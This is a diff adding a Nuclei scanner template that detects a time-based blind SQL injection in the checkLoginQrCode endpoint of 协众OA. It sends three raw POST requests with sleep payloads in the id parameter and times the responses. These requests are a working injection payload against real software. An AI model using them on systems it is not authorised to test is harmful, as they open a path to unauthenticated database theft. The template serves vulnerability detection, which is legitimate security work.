@@ -1,0 +1,57 @@
+id: xzoa-id-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 协众OA checkLoginQrCode 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。
+  reference:
+    - https://github.com/wy876/POC/commit/7b901f2d74fd35dab03f6ebeb289c9d2e14ddaa0#diff-f0a47f9c06ab6e81a32cc1fb1891728f55a3ffbbf3a59d5340c067d462a90499R7
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Priority: u=0, i
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Content-Length: 37
+
+        id=(select * from (select sleep(3))z)
+      - |-
+        POST /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Priority: u=0, i
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Content-Length: 37
+
+        id=(select * from (select sleep(6))z)
+      - |-
+        POST /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Priority: u=0, i
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Content-Length: 37
+
+        id=(select * from (select sleep(9))z)
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
